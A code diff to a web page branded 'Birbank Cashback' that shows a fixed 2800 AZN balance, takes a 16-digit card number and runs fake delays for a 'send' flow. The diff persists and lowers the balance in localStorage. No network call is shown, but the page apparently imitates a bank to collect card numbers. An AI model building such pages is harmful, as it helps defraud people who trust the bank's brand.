@@ -226,9 +226,7 @@
             <div style="color: gray; font-size: 14px; margin-bottom: 6px">
               Birbank Cashback
             </div>
-            <div class="balance" style="color: black; font-size: 13px">
-              2800 AZN
-            </div>
+            <div class="balance" style="color: black; font-size: 13px"></div>
           </div>
         </div>
       </div>
@@ -251,13 +249,12 @@
             type="number"
             step="0.01"
             min="0.01"
-            max="2800"
           />
           <select class="input">
             <option>AZN</option>
           </select>
         </div>
-        <small>Min: 0.01 AZN, Maks: 2800 AZN</small>
+        <small>Min: 0.01 AZN, Maks: balans qədər</small>
         <div class="row" style="margin-top: 10px">
           <button class="amount-btn" onclick="add(10)">+10</button>
           <button class="amount-btn" onclick="add(20)">+20</button>
@@ -301,13 +298,25 @@
       const bankLabel = document.getElementById("bankLabel");
       const resultContainer = document.getElementById("resultContainer");
       const spinnerOverlay = document.getElementById("spinnerOverlay");
-      const MAX_BALANCE = 2800;
+
+      // ✅ Balans localStorage ilə idarə olunur
+      let balance = localStorage.getItem("balance")
+        ? parseFloat(localStorage.getItem("balance"))
+        : 2800;
+
+      function updateBalance() {
+        document.querySelector(".balance").innerText =
+          balance.toLocaleString("az-AZ") + " AZN";
+      }
+
+      updateBalance();
 
       function formatCard(val) {
         let d = val.replace(/\D/g, "");
         if (d.length > 16) d = d.slice(0, 16);
         return d.replace(/(.{4})/g, "$1 ").trim();
       }
+
       card.addEventListener("input", () => {
         card.value = formatCard(card.value);
         validate();
@@ -320,7 +329,7 @@
       function add(x) {
         let v = parseFloat(amount.value) || 0;
         let nv = v + x;
-        if (nv > MAX_BALANCE) nv = MAX_BALANCE;
+        if (nv > balance) nv = balance;
         amount.value = nv.toFixed(2);
         validate();
       }
@@ -329,7 +338,7 @@
       function validate() {
         let amt = parseFloat(amount.value.replace(",", "."));
         let cnum = card.value.replace(/\s/g, "");
-        if (amt >= 0.01 && amt <= MAX_BALANCE && cnum.length === 16)
+        if (amt >= 0.01 && amt <= balance && cnum.length === 16)
           btn.classList.add("active");
         else btn.classList.remove("active");
       }
@@ -337,7 +346,7 @@
       function sendStep1() {
         let amt = parseFloat(amount.value.replace(",", "."));
         let cnum = card.value.replace(/\s/g, "");
-        if (!(amt >= 0.01 && amt <= MAX_BALANCE)) {
+        if (!(amt >= 0.01 && amt <= balance)) {
           amount.classList.add("error");
           return;
         }
@@ -347,7 +356,6 @@
         }
 
         spinnerOverlay.style.display = "flex";
-        spinnerOverlay.style.position = "fixed";
 
         setTimeout(() => {
           spinnerOverlay.style.display = "none";
@@ -359,10 +367,7 @@
             resultContainer.style.opacity = 1;
             resultContainer.style.transform = "translateY(0)";
           }, 50);
-          resultContainer.scrollIntoView({
-            behavior: "smooth",
-            block: "center",
-          });
+          resultContainer.scrollIntoView({ behavior: "smooth", block: "center" });
 
           btn.onclick = sendStep2;
         }, 1000);
@@ -372,8 +377,14 @@
         let amt = parseFloat(amount.value.replace(",", "."));
         let cnum = card.value.replace(/\s/g, "");
         const last4 = cnum.slice(-4);
+
+        // ✅ Balansı azaldırıq və localStorage-a yazırıq
+        balance -= amt;
+        if (balance < 0) balance = 0;
+        localStorage.setItem("balance", balance);
+        updateBalance();
+
         spinnerOverlay.style.display = "flex";
-        spinnerOverlay.style.position = "fixed";
 
         setTimeout(() => {
           spinnerOverlay.style.display = "none";
